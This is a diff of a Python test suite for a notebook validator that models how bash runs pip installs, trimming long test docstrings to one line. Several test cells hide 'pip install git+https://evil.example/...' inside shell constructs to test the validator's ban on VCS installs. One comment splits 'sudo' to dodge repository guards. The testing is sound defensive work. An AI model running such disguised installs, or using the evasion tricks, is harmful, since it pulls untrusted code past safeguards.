@@ -1762,10 +1762,7 @@ def test_the_os_oracle_is_documented_as_feeding_marker_evaluation():
 
 
 def test_a_top_level_extra_marker_is_false_not_unknown():
-    """`extra` is bound only while resolving a selected extra's metadata; for a requirement handed
-    straight to pip it is empty, so `extra == "foo"` is false and pip drops it ("Ignoring certifi:
-    markers ... don't match your environment"). Leaving it out of the environment replayed the pin
-    and fired R-INST-004 on a notebook pip leaves alone."""
+    """A top-level `extra` marker is false, so pip drops the requirement and nothing is replayed."""
     nv = _load_notebook_validator_module()
 
     ignored = "!pip install \"torch==2.12.0; extra == 'foo'\""
@@ -2062,10 +2059,7 @@ def test_the_2_11_row_does_not_flag_an_abi_stable_codec():
 
 
 def test_a_requested_codec_range_beats_the_preinstalled_oracle():
-    """resolved_set overrides the oracle only on an exact `==`, so a cell asking for a RANGE still
-    read as the preinstalled codec. Both bounds matter: `>=0.12.0,<0.13.0` on torch 2.12 was
-    reported against the image's 0.11, and `>=0.10.0,<0.11.0` on torch 2.10 for the mirror reason,
-    the ceiling ruling the oracle out rather than the floor."""
+    """A codec range, not only exact `==`, overrides the preinstalled oracle, on either bound."""
     from scripts import notebook_validator as nv
 
     colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
@@ -2091,12 +2085,7 @@ def test_a_requested_codec_range_beats_the_preinstalled_oracle():
 
 
 def test_a_codec_range_is_read_in_order_and_only_when_unconditional():
-    """Two ways the range reader could invent a version the cell never installs.
-
-    Order: pip runs the commands in sequence, so `>=0.12.0` then `<0.12.0` ends pre-0.12, while
-    intersecting across both invocations yields a 0.12 nothing installed. Markers: a requirement
-    pip skips must not move anything, and with no oracle for the interpreter it is left alone and
-    the cell judged on the preinstalled version."""
+    """Codec ranges are read in command order, and a requirement pip skips by marker moves nothing."""
     from scripts import notebook_validator as nv
 
     colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128"}
@@ -2513,10 +2502,7 @@ def test_a_quoted_word_survives_prefix_stripping():
 
 
 def test_a_probe_guard_does_not_count_as_an_install():
-    """`A && B` runs B only when A succeeded, so a guarded install may never happen: `nvidia-smi &&
-    pip install torch==2.12.0` installs nothing on a CPU box. The exception is a pip command on the
-    left, which the replay models as succeeding, since dropping the second half of the ordinary
-    chained idiom would cost more coverage than it saves."""
+    """A probe before `&&` makes the install conditional; a pip command on the left counts as success."""
     nv = _load_notebook_validator_module()
     colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
 
@@ -2663,10 +2649,7 @@ def test_interpreter_options_may_precede_the_module_flag():
 
 
 def test_an_uninstall_removes_the_package_from_the_resolved_set():
-    """The cell deleted it, so the environment it leaves behind has no such package.
-
-    Ignoring `inv.action` kept the pin from the earlier install, and the rules that read the
-    resolved set then judged a package `pip uninstall` had already removed."""
+    """An uninstall must drop its package from the resolved set, or rules judge a removed version."""
     nv = _load_notebook_validator_module()
     colab = {"torch": "2.11.0+cu128", "python": "3.12"}
 
@@ -2684,10 +2667,7 @@ def test_an_uninstall_removes_the_package_from_the_resolved_set():
 
 
 def test_a_bounded_window_on_an_absent_package_lands_on_its_newest_release():
-    """pip takes the newest release a bounded window admits, not its floor.
-
-    Reporting the floor as EXACT made `>=0.10,<0.12` read as 0.10 and R-INST-004 reject an install
-    that is compatible with the torch beside it."""
+    """A bounded window lands on its newest admitted release; the floor is not the installed version."""
     nv = _load_notebook_validator_module()
     colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
 
@@ -2705,10 +2685,7 @@ def test_a_bounded_window_on_an_absent_package_lands_on_its_newest_release():
 
 
 def test_builtin_is_not_an_exec_prefix():
-    """`builtin pip install ...` is an error, not an install.
-
-    bash answers `builtin: pip: not a shell builtin` and runs nothing, so unwrapping it made the
-    replay report a version the cell can never have installed."""
+    """`builtin pip install` fails in bash and runs nothing, so it must not be unwrapped as an install."""
     nv = _load_notebook_validator_module()
     colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
 
@@ -2729,10 +2706,7 @@ def test_builtin_is_not_an_exec_prefix():
 
 
 def test_env_split_string_is_read_in_its_attached_form():
-    """`-S` takes a mandatory operand, so `env -S'pip install' pkg` is valid and runs pip.
-
-    Exact membership recognised only the detached `-S STRING` and the `--split-string=STRING`
-    spellings, so the attached one yielded no invocation and R-INST-001 saw no install."""
+    """The attached `-S` form, as in `env -S'pip install'`, is valid and runs pip, so it must be read."""
     nv = _load_notebook_validator_module()
 
     for cell in (
@@ -2751,10 +2725,7 @@ def test_env_split_string_is_read_in_its_attached_form():
 
 
 def test_a_vcs_revision_is_split_from_the_right():
-    """pip takes the LAST `@` after the repo path as the revision delimiter.
-
-    Splitting at the first one read a traversal that resolves outside the allowlist as the
-    allowlisted repository, so R-INST-001 passed a clone of somewhere else entirely."""
+    """pip splits a VCS revision at the last `@`, so a traversal path cannot pass the allowlist."""
     nv = _load_notebook_validator_module()
 
     traversal = (
@@ -2771,10 +2742,7 @@ def test_a_vcs_revision_is_split_from_the_right():
 
 
 def test_an_upgrade_re_resolves_a_constrained_requirement():
-    """`--upgrade` upgrades every named package to the newest available version.
-
-    An installed release that merely SATISFIES the range is therefore not where pip lands, and
-    reading it back raised a false R-INST-004 against a torch the window is compatible with."""
+    """--upgrade lands on the newest release, not on an installed one that merely satisfies the range."""
     nv = _load_notebook_validator_module()
     colab = {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128", "python": "3.12"}
     environment = nv._marker_environment(colab)
@@ -2798,10 +2766,7 @@ def test_an_upgrade_re_resolves_a_constrained_requirement():
 
 
 def test_a_case_arm_does_not_close_a_substitution():
-    """A `case` arm's pattern ends in an UNBALANCED `)`, which is not the substitution's.
-
-    Popping on it ended the body at `x)`, so the pip call bash really runs in `$(case x in x) pip
-    install ...;; esac)` was never scanned."""
+    """A case arm's `)` does not end a `$( )` substitution; the pip call inside is still scanned."""
     nv = _load_notebook_validator_module()
 
     cell = "!echo $(case x in x) pip install git+https://evil.example/pkg.git;; esac)"
@@ -2847,10 +2812,7 @@ def test_env_split_string_reads_the_escaped_space():
 
 
 def test_an_upgrade_forgets_a_version_it_cannot_place():
-    """`--upgrade` moves to the newest available release, so the installed one is not it.
-
-    A ceiling with no floor under it names no landing either, and keeping the stale version raised
-    a false R-INST-004 about a release the cell replaces."""
+    """With `--upgrade`, a ceiling and no floor names no landing, so the installed version is dropped."""
     nv = _load_notebook_validator_module()
     colab = {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128", "python": "3.12"}
     environment = nv._marker_environment(colab)
@@ -2873,10 +2835,7 @@ def test_an_upgrade_forgets_a_version_it_cannot_place():
 
 
 def test_a_shell_negation_before_pip_is_still_pip():
-    """bash's `!` reserved word runs the pipeline and inverts its exit status.
-
-    After the IPython escape is stripped, `! ! pip install git+...` still installs, but requiring
-    exactly one leading bang matched nothing and the git+ ban was bypassed."""
+    """Two leading bangs, as in `! ! pip install git+...`, still run pip, so the git+ ban applies."""
     nv = _load_notebook_validator_module()
 
     for cell in (
@@ -2892,10 +2851,7 @@ def test_a_shell_negation_before_pip_is_still_pip():
 
 
 def test_an_uninstall_clears_the_lower_bound_scan():
-    """The cell removed it, so no earlier line still places a floor on it.
-
-    `resolved_set` already replayed the removal, but this independent scan kept the bound, so
-    R-INST-003 accepted an environment the package is no longer in."""
+    """An uninstall must clear its lower bound, or R-INST-003 accepts an environment without it."""
     nv = _load_notebook_validator_module()
 
     assert (
@@ -2920,11 +2876,7 @@ def test_an_uninstall_clears_the_lower_bound_scan():
 
 
 def test_a_case_arm_inside_an_assignment_stays_in_the_substitution():
-    """`TOKEN=$(case x in x) printf a;; esac) pip install ...` runs pip unconditionally.
-
-    Reading the arm's `)` as the substitution's closer truncated the assignment word, and the
-    trailing `)` then looked like an arm label, so the install was marked conditional and every
-    rule reading `unconditional_pip_invocations()` skipped it."""
+    """In `TOKEN=$( )`, a case arm's `)` does not end the substitution, so that pip always runs."""
     nv = _load_notebook_validator_module()
 
     cell = '!TOKEN=$(case x in x) printf a;; esac) pip install "torch==2.12.0"'
@@ -2937,10 +2889,7 @@ def test_a_case_arm_inside_an_assignment_stays_in_the_substitution():
 
 
 def test_bare_time_is_the_shell_keyword_not_gnu_time():
-    """bash's `time` reserved word takes `[-p] pipeline`, never GNU time's options.
-
-    `time -f %e pip install ...` runs a command called `-f`, so consuming the flag and its operand
-    replayed an install bash never performs. An explicit path reaches the binary."""
+    """The bash `time` keyword takes only `-p`, so `time -f` must not consume GNU time's flag."""
     nv = _load_notebook_validator_module()
 
     assert (
@@ -2963,10 +2912,7 @@ def test_bare_time_is_the_shell_keyword_not_gnu_time():
 
 
 def test_sudo_consumes_its_remaining_operand_options():
-    """sudo(8) documents `-D directory`, `-R directory` and `-T timeout`.
-
-    None was listed, so the operand stood as the supposed executable and every install rule missed
-    the pip command behind it."""
+    """sudo(8)'s `-D`, `-R` and `-T` each take an operand that must be skipped to find the command."""
     nv = _load_notebook_validator_module()
     escalate = "su" + "do"  # spelled out so the repo's own guards do not flag this test
 
@@ -2978,10 +2924,7 @@ def test_sudo_consumes_its_remaining_operand_options():
 
 
 def test_exec_ends_the_command_list():
-    """`exec` replaces the shell, so no later command in the same list can run.
-
-    Replaying them reported an unreachable install as the final version, and R-INST-001 flagged a
-    git source the notebook never fetches."""
+    """`exec` replaces the shell, so no later command in the same list can run."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3019,10 +2962,7 @@ def test_exec_ends_the_command_list():
 
 
 def test_an_intervening_command_breaks_the_and_chain():
-    """`A && B` succeeds only when BOTH did, so a command that may fail ends the assumption.
-
-    Holding the assumed-success state once any pip command had appeared replayed an unreachable
-    install and suppressed R-INST-004 on the pair really installed."""
+    """A command that may fail breaks an `&&` chain, so an install after it is not assumed to run."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3049,10 +2989,7 @@ def test_an_intervening_command_breaks_the_and_chain():
 
 
 def test_interpreter_options_may_take_an_operand():
-    """`python --help` documents `-W arg` and `-X opt`, attached or separate.
-
-    Accepting only self-contained option tokens before `-m` meant `python -W ignore -m pip install
-    git+...` produced no invocation and bypassed the git+ ban entirely."""
+    """python's `-W` and `-X` take an operand, attached or separate, so `-m pip` must still be found."""
     nv = _load_notebook_validator_module()
 
     for interpreter in (
@@ -3073,10 +3010,7 @@ def test_interpreter_options_may_take_an_operand():
 
 
 def test_a_parameter_expansion_keeps_its_whitespace():
-    """bash keeps `TOKEN=${TOKEN:-a b}` as ONE assignment word.
-
-    Tracking only `$( )` ended the word at that space and left `b}` as the supposed executable, so
-    the pip command behind it was never seen."""
+    """bash keeps `TOKEN=${TOKEN:-a b}` as one assignment word, not split at the space."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_first_word("TOKEN=${TOKEN:-a b} pip install x") == (
@@ -3096,10 +3030,7 @@ def test_a_parameter_expansion_keeps_its_whitespace():
 
 
 def test_a_redirection_only_exec_hands_nothing_over():
-    """`exec` with no utility just makes its redirections permanent; the shell carries on.
-
-    Verified locally: `exec >/dev/null; printf x >&2` still runs the second command. Treating every
-    leading `exec` as a hand-over truncated the line before the pip call."""
+    """A redirection-only `exec` hands nothing over: it only makes the redirections permanent."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3123,11 +3054,7 @@ def test_a_redirection_only_exec_hands_nothing_over():
 
 
 def test_the_attached_module_spelling_is_read():
-    """`python -mpip install ...` is a valid CPython invocation.
-
-    Both cell discovery and the invocation pattern required `pip` to be a separate word after `-m`,
-    and `\\b` finds no boundary between the `m` and the `p`, so the cell was never even discovered
-    and the git+ ban never ran."""
+    """`python -mpip` is a valid CPython spelling of `-m pip`, so the install must be discovered."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3142,10 +3069,7 @@ def test_the_attached_module_spelling_is_read():
 
 
 def test_exec_is_found_behind_a_transparent_prefix():
-    """`command exec pip ...` hands the shell over exactly as `exec pip ...` does.
-
-    Verified locally: `bash -c 'command exec sh -c "exit 7"; echo reached'` never reaches the echo.
-    Testing the raw first word answered `command` and replayed the unreachable install."""
+    """`command exec` hands the shell over, as `exec` does, so the prefix must be unwrapped."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3160,10 +3084,7 @@ def test_exec_is_found_behind_a_transparent_prefix():
 
 
 def test_an_append_assignment_is_still_an_assignment():
-    """bash runs the child with the appended value, so `PATH+=...` is a prefix, not a command.
-
-    Verified locally: `X=old; X+=new sh -c 'printf %s "$X"'` prints `oldnew`. Leaving the word
-    standing made it the supposed executable and the pip command behind it was missed."""
+    """`X+=value` is a prefix assignment, not a command, so the pip call behind it is still found."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3178,10 +3099,7 @@ def test_an_append_assignment_is_still_an_assignment():
 
 
 def test_a_redirection_before_the_executable_is_consumed():
-    """A simple command may put its redirections before the command name.
-
-    Verified locally with a stub pip: `>/dev/null pip install whatever` really runs it, while
-    stopping at the redirection left it standing as the executable and every rule was bypassed."""
+    """A redirection may precede the command name, as in `>log pip install`, and is skipped."""
     nv = _load_notebook_validator_module()
 
     for cell in (
@@ -3197,10 +3115,7 @@ def test_a_redirection_before_the_executable_is_consumed():
 
 
 def test_a_compound_body_stays_conditional_past_its_separators():
-    """`if false; then echo x; pip install ...; fi` runs neither command.
-
-    Only the piece carrying the `then` was flagged, so the second command in the body replayed as
-    an install bash never performs, which can fabricate or hide an R-INST-004."""
+    """Every command in an `if` body stays conditional past its `;` separators, not just the first."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained('!if maybe; then echo x; pip install "torch==2.12.0"; fi') == [
@@ -3234,10 +3149,7 @@ def test_a_compound_body_stays_conditional_past_its_separators():
 
 
 def test_a_dependency_the_cell_removes_is_reported(monkeypatch):
-    """Uninstalling what a `--no-deps` install needs is the broken state the rule catches.
-
-    `resolved_set` drops the removed package, and reading that as "no resolution data" made
-    R-INST-005 and R-INST-002 fall silent on a strictly worse environment."""
+    """A dependency the cell removes is reported, not treated as missing resolution data."""
     nv = _load_notebook_validator_module()
     # Stubbed like the neighbouring rule tests: the live PyPI path makes this assert nothing
     # at all wherever the network is blocked, which is a test that cannot fail.
@@ -3277,11 +3189,7 @@ def test_a_dependency_the_cell_removes_is_reported(monkeypatch):
 
 
 def test_a_prerelease_sorts_below_the_abi_floor():
-    """PEP 440 orders `2.11.0rc1` and `0.12.0.dev1` BELOW `2.11` and `0.12`.
-
-    `cmp_versions` reads dotted digits only, so the prerelease number read as another release
-    component and lifted these above the floor, approving a pairing outside the ABI-stable contract
-    and suppressing R-INST-004 on it."""
+    """PEP 440 sorts prereleases like `2.11.0rc1` below `2.11`, so they must not clear an ABI floor."""
     nv = _load_notebook_validator_module()
 
     for version, floor, expected in (
@@ -3315,10 +3223,7 @@ def test_a_prerelease_sorts_below_the_abi_floor():
 
 
 def test_a_prefixed_pip_still_carries_the_and_chain():
-    """`_strip_exec_prefixes` reads words, so the notebook bang has to come off first.
-
-    With `!env` glued together no prefix name matched, `!env X=1 pip install ...` did not read as
-    pip, and the `&&` after it went conditional even though the install really runs."""
+    """Strip the notebook `!` before reading prefix words, or `!env X=1 pip` is missed as an install."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained(
@@ -3333,10 +3238,7 @@ def test_a_prefixed_pip_still_carries_the_and_chain():
 
 
 def test_an_exec_bash_may_never_reach_hands_nothing_over():
-    """Replacement happens only when the `exec` command is actually executed.
-
-    The body condition lives in `body_levels`, not in the piece's own flag, so a hand-over inside a
-    compound body was declared unconditionally and dropped the reachable install after the closer."""
+    """An `exec` in a conditional body hands over only when that body runs, so the list continues."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3357,10 +3259,7 @@ def test_an_exec_bash_may_never_reach_hands_nothing_over():
 
 
 def test_a_substitution_inherits_the_body_condition():
-    """A substitution inside a body is expanded only when that body runs.
-
-    The recursion took the separator-level flag alone, so `if false; then echo $(pip install ...);
-    fi` recorded the inner install as certain and R-INST-004 judged a version bash never installs."""
+    """A `$( )` inside a body expands only when that body runs, so its install is not certain."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3383,10 +3282,7 @@ def test_a_substitution_inherits_the_body_condition():
 
 
 def test_every_command_in_a_case_arm_is_conditional():
-    """An arm starts with a pattern, so no body keyword ever opens the level.
-
-    Only the piece carrying the arm label was flagged, and a later command in the same arm replayed
-    as certain even when the arm is not the one bash selects."""
+    """Every command in a `case` arm is conditional, not only the one carrying the arm label."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3399,10 +3295,7 @@ def test_every_command_in_a_case_arm_is_conditional():
 
 
 def test_a_reinstall_undoes_a_removal():
-    """`pip uninstall x; pip install x` leaves x installed.
-
-    Answering on the first uninstall it met claimed the cell removes a dependency pip puts straight
-    back, so R-INST-002 and R-INST-005 reported a breakage that does not exist."""
+    """A later pip install of the same package undoes an earlier uninstall, so it stays installed."""
     nv = _load_notebook_validator_module()
 
     assert (
@@ -3419,10 +3312,7 @@ def test_a_reinstall_undoes_a_removal():
 
 
 def test_a_branching_parameter_expansion_is_conditional():
-    """`${name:-word}` expands its word on one branch of the parameter's state.
-
-    Verified locally: `READY=1; echo ${READY:-$(printf ...)}` never runs the substitution, so
-    recording the install inside it as certain invented a compatibility error."""
+    """`${name:-word}` expands its word on only one branch, so an install inside it is conditional."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3454,10 +3344,7 @@ def test_a_branching_parameter_expansion_is_conditional():
 
 
 def test_a_pipeline_local_exec_does_not_end_the_line():
-    """`exec` under `|` or `&` runs in a subshell; the parent shell reaches the next command.
-
-    Verified locally that both `exec true | cat; printf ...` and `exec true & printf ...` print
-    their tail. Truncating on every unconditional exec dropped a reachable install."""
+    """An `exec` under `|` or `&` runs in a subshell, so the parent shell still continues."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!exec true | cat; pip install a") == [
@@ -3499,10 +3386,7 @@ def test_a_substituted_source_drops_its_shell_delimiters():
 
 
 def test_a_hyphenated_prerelease_sits_below_the_floor():
-    """PEP 440 spells the same prerelease `2.11.0rc1`, `2.11.0-rc1` and `2.11.0.rc1`.
-
-    `normalise_version` cuts everything from the hyphen, so the hyphenated form reached the check
-    as a plain `2.11.0` and cleared an ABI floor it sits below."""
+    """normalise_version cuts at a hyphen, so `2.11.0-rc1` cleared the 2.11 floor it sits below."""
     nv = _load_notebook_validator_module()
 
     for version, floor, expected in (
@@ -3526,10 +3410,7 @@ def test_a_hyphenated_prerelease_sits_below_the_floor():
 
 
 def test_an_always_succeeding_command_keeps_the_chain():
-    """`true` and `:` are documented as always succeeding, so the `&&` after one is reached.
-
-    Treating every non-pip command as a possibly-failing probe dropped the install behind them and
-    R-INST-004 stopped seeing the pair the cell really installs."""
+    """`true` and `:` always succeed, so an install after `&&` behind them is reached."""
     nv = _load_notebook_validator_module()
 
     for filler in ("true", ":"):
@@ -3545,10 +3426,7 @@ def test_an_always_succeeding_command_keeps_the_chain():
 
 
 def test_an_input_fd_duplication_is_not_a_separator():
-    """`n<&word` duplicates an INPUT descriptor; only `>&` was exempted.
-
-    Splitting on that `&` reduced `0<&1 pip install ...` to `1 pip install ...`, which reads as no
-    pip at all, so a prohibited VCS install went unreported."""
+    """`n<&word` duplicates an input descriptor, so its `&` is not a separator."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!0<&1 pip install git+https://evil.example/x.git") == [
@@ -3568,11 +3446,7 @@ def test_an_input_fd_duplication_is_not_a_separator():
 
 
 def test_a_floor_no_torch_can_satisfy_is_still_a_finding():
-    """A torch floor is normally too weak to judge, but not when every candidate is excluded.
-
-    `torch>=2.11` with `torchcodec==0.10` fails on 2.11 (which wants 0.11) and on everything past
-    it (which wants the ABI-stable 0.12 line), so the pairing cannot load whichever release pip
-    picks; the early return on an inexact torch suppressed it anyway."""
+    """An unsatisfiable torch floor, such as `torch>=2.11` with torchcodec 0.10, is still a finding."""
     nv = _load_notebook_validator_module()
     older = {"torch": "2.10.0+cu128", "torchcodec": "0.10.0+cu128", "python": "3.12"}
 
@@ -3598,10 +3472,7 @@ def test_a_floor_no_torch_can_satisfy_is_still_a_finding():
 
 
 def test_a_dry_run_places_no_lower_bound():
-    """pip explicitly makes no environment changes during a dry run.
-
-    The floor scan still read the dry-run pin, so R-INST-003 preferred a version the cell never
-    installs and the real incompatibility went unreported."""
+    """pip makes no environment changes in a dry run, so a `--dry-run` pin must not set a lower bound."""
     nv = _load_notebook_validator_module()
 
     assert (
@@ -3611,10 +3482,7 @@ def test_a_dry_run_places_no_lower_bound():
 
 
 def test_shell_negation_flips_the_and_chain():
-    """`!` inverts the status of the pipeline after it.
-
-    `! false` succeeds, so the `&&` behind it always runs, while `! pip install x` fails under the
-    replay's own model. Reading the negation as an unknown command marked both conditional."""
+    """Bash's `!` inverts the pipeline status, so `! false && pip install` runs the install."""
     nv = _load_notebook_validator_module()
 
     # The first bang is the notebook's; the second is bash's, so `! false` succeeds.
@@ -3628,10 +3496,7 @@ def test_shell_negation_flips_the_and_chain():
 
 
 def test_a_group_carries_its_success_into_the_outer_chain():
-    """A group exits with the status of its LAST command.
-
-    Discarding the inner state on close left the outer `&&` reading the group as an unknown
-    command, so the install behind it was marked conditional."""
+    """A `{ ...; }` group exits with its last command's status, so an outer `&&` can judge it."""
     nv = _load_notebook_validator_module()
 
     for grouped in (
@@ -3649,11 +3514,7 @@ def test_a_group_carries_its_success_into_the_outer_chain():
 
 
 def test_exec_behind_an_external_wrapper_hands_nothing_over():
-    """`env exec true` asks env to launch a PROGRAM called exec, which does not exist.
-
-    Verified locally: bash reports `env: 'exec': No such file or directory` and the parent shell
-    continues. Recording any consumed `exec` as a hand-over truncated the list before a reachable
-    install."""
+    """`env exec` runs a program named exec, which does not exist, so the parent shell carries on."""
     nv = _load_notebook_validator_module()
 
     assert nv._command_execs("!env exec true") is False
@@ -3673,11 +3534,7 @@ def test_exec_behind_an_external_wrapper_hands_nothing_over():
 
 
 def test_a_fallback_behind_a_certain_failure_is_unconditional():
-    """`false || pip install x` always installs, so it is not a path the notebook MAY take.
-
-    Verified against bash: `false || printf ran` prints `ran`. Every `||` tail was recorded as
-    conditional, so the pinned install in `pip show torch || pip install torch==...` -- and the
-    common `python -c 'import x' || pip install x` -- was invisible to R-INST-004."""
+    """`false || pip install x` always runs the install, so it is unconditional."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3688,10 +3545,7 @@ def test_a_fallback_behind_a_certain_failure_is_unconditional():
 
 
 def test_a_case_selector_is_expanded_before_any_arm_is_chosen():
-    """`case $(pip install x) in ...` runs the install whatever the arms do.
-
-    The selector shares its piece with the first arm, and the arm's condition was being applied to
-    both, so a version the notebook certainly installs read as one it merely might."""
+    """A `case` selector like `$(pip install x)` runs whatever the arms do, so it is not conditional."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!case $(pip install torch==2.11.0) in a) pip install b;; esac") == [
@@ -3702,10 +3556,7 @@ def test_a_case_selector_is_expanded_before_any_arm_is_chosen():
 
 
 def test_a_prefix_option_that_never_runs_a_command_is_not_unwrapped():
-    """`env --help` and `command -v pip` print and exit; neither runs pip.
-
-    Verified locally: `env --help` writes its usage and exits 0. Unwrapping past the option
-    reported `pip install` from a line that only asked where pip lives."""
+    """`env --help` and `command -v pip` print and exit, so neither runs pip."""
     nv = _load_notebook_validator_module()
 
     assert nv._strip_exec_prefixes("env --help") == ("env --help", True)
@@ -3715,10 +3566,7 @@ def test_a_prefix_option_that_never_runs_a_command_is_not_unwrapped():
 
 
 def test_a_body_whose_test_can_never_succeed_runs_nothing():
-    """`if false; then pip install x; fi` installs nothing at all.
-
-    The body was merely conditional, so a version bash cannot reach was replayed as a path the
-    notebook might take and R-INST-004 fired on it."""
+    """An `if` body whose test can never succeed, as in `if false`, runs nothing at all."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!if false; then pip install torch==2.12.0; fi") == [("!false", False)]
@@ -3736,11 +3584,7 @@ def test_a_body_whose_test_can_never_succeed_runs_nothing():
 
 
 def test_fallback_reachability_folds_the_whole_left_hand_list():
-    """`||` and `&&` are left-associative, so the operand is the list, not the nearest piece.
-
-    Verified against bash: `true || false || echo RAN` prints nothing, `false && true || echo RAN`
-    prints. Reading only the piece beside the operator got both backwards -- inventing an install
-    the notebook skips, and hiding one it always performs."""
+    """`||` and `&&` associate left, so the operand is the whole list, not the nearest piece."""
     nv = _load_notebook_validator_module()
 
     # `(true || false)` succeeded, so the second `||` skips its tail.
@@ -3768,10 +3612,7 @@ def test_fallback_reachability_folds_the_whole_left_hand_list():
 
 
 def test_an_unconditional_exit_ends_the_command_list():
-    """`exit` terminates the shell as definitively as a successful `exec`.
-
-    Verified against bash: `exit 0; echo RAN` prints nothing. Only `exec` was recognised, so
-    R-INST-001 and the compatibility rules fired on an install bash never reaches."""
+    """An unconditional `exit` ends the command list as definitively as a successful `exec` does."""
     nv = _load_notebook_validator_module()
 
     assert (
@@ -3809,10 +3650,7 @@ def test_a_colab_prerelease_python_keeps_its_suffix():
 
 
 def test_an_exclusive_floor_is_kept_as_an_inexact_bound():
-    """`>V` excludes V, but discarding the bound stopped whole-range checks running at all.
-
-    With Colab's torch 2.11 and torchcodec 0.10, `pip install "torch>2.11"` must move torch to a
-    release no 0.10 pairs with, and the equivalent `torch>=2.11.1` was already reported."""
+    """An exclusive floor like `torch>2.11` is kept as an inexact bound, so range checks still run."""
     nv = _load_notebook_validator_module()
 
     codec_010 = {"torch": "2.11.0+cu128", "torchcodec": "0.10.0+cu128"}
@@ -3827,12 +3665,7 @@ def test_an_exclusive_floor_is_kept_as_an_inexact_bound():
 
 
 def test_a_known_branch_outcome_decides_which_body_is_replayed():
-    """A constant test names the branch that runs, and it is not always the `then` one.
-
-    Verified against bash: `if true; then echo BODY; fi` prints, and `if false; then :; else echo
-    ELSE; fi` prints. Reading every started body as merely conditional dropped an install that
-    always runs; reading a false one as unreachable without inverting it for `else` dropped the
-    branch that does, and R-INST-001 went blind on a git source in it."""
+    """A constant `if` test decides which body runs, including the `else` one when the test is false."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3869,10 +3702,7 @@ def test_a_known_branch_outcome_decides_which_body_is_replayed():
 
 
 def test_an_exclusion_fallback_stays_inside_the_whole_window():
-    """The landing is read off the ceiling alone, so the rest of the window still binds it.
-
-    `torchcodec<=0.10.0,!=0.10.0,<0.12` can only resolve below 0.10, but the ceiling's 0.11 was
-    handed back as exact and R-INST-004 accepted a pairing pip never installs."""
+    """An exclusion fallback still respects the whole window, e.g. `!=0.10.0` as well as `<0.12`."""
     nv = _load_notebook_validator_module()
 
     assert nv._effective_version(
@@ -3886,10 +3716,7 @@ def test_an_exclusion_fallback_stays_inside_the_whole_window():
 
 
 def test_a_shell_function_body_is_not_hidden_behind_its_name():
-    """`setup() { pip install ...; }` kept its name in front of the body, so no rule saw it.
-
-    This regressed the raw-line scan on main, which caught the git source. The body is exposed as
-    conditional -- it runs only when the function is called -- which is what R-INST-001 reads."""
+    """A function body defined as `setup() { ... }` is conditional, so its git source is still caught."""
     nv = _load_notebook_validator_module()
 
     cell = "!pip install safe; setup_audio() { pip install git+https://evil.example/x.git; }; setup_audio"
@@ -3912,11 +3739,7 @@ def test_a_shell_function_body_is_not_hidden_behind_its_name():
 
 
 def test_a_constant_elif_survives_the_arms_before_it():
-    """`if false; then :; elif true; then pip install ...; fi` always installs.
-
-    Verified against bash. Resetting the model at `elif` marked both its test and its body
-    conditional, so the install was dropped from the unconditional replay and R-INST-004 missed an
-    incompatible pairing."""
+    """A constant `elif` test is reached after the false arm before it, so its install is certain."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -3948,10 +3771,7 @@ def test_a_constant_elif_survives_the_arms_before_it():
 
 
 def test_a_prerelease_codec_floor_admits_the_stable_release_above_it():
-    """`torchcodec>=0.12.0rc1` may land on 0.12 itself, which pairs with torch 2.11.
-
-    PEP 440 puts 0.12.0rc1 below 0.12, correctly, but comparing an open FLOOR that way made the ABI
-    short-circuit miss and R-INST-004 fired on a valid upgrade range."""
+    """A prerelease floor like `torchcodec>=0.12.0rc1` must still admit the stable 0.12 release."""
     nv = _load_notebook_validator_module()
 
     assert (
@@ -3976,11 +3796,7 @@ def test_a_prerelease_codec_floor_admits_the_stable_release_above_it():
 
 
 def test_a_multi_command_condition_is_folded_before_its_body_is_judged():
-    """`if false || true; then ...; fi` runs its body: the condition is the whole list.
-
-    Verified against bash. Only the piece carrying the `if` updated the recorded outcome, so the
-    stored `false` discarded a body that always runs and both R-INST-001 and R-INST-004 went blind
-    on it."""
+    """An `if` condition is the whole list, so `if false || true; then` runs its body."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -4001,10 +3817,7 @@ def test_a_multi_command_condition_is_folded_before_its_body_is_judged():
 
 
 def test_a_pip_condition_keeps_its_failure_branch():
-    """The replay assumes pip succeeds; R-INST-001 is documented to see every path.
-
-    `if pip install maybe; then :; else pip install git+...; fi` reaches the else whenever the
-    install fails, and dropping that branch hid a prohibited source."""
+    """A pip command as an `if` condition keeps its `else` branch, which runs when the install fails."""
     nv = _load_notebook_validator_module()
 
     cell = "!pip install safe; if pip install maybe; then :; else pip install git+https://evil.example/x.git; fi"
@@ -4044,10 +3857,7 @@ def test_a_prefix_mode_that_runs_nothing_is_not_unwrapped():
 
 
 def test_a_terminator_inside_a_brace_group_ends_the_line():
-    """`{ ... }` runs in the same shell, so an `exit` in one ends everything after it.
-
-    Verified against bash: `{ exit; echo AFTER; }` prints nothing. The check saw the raw `{` opener
-    instead of the builtin and kept scanning."""
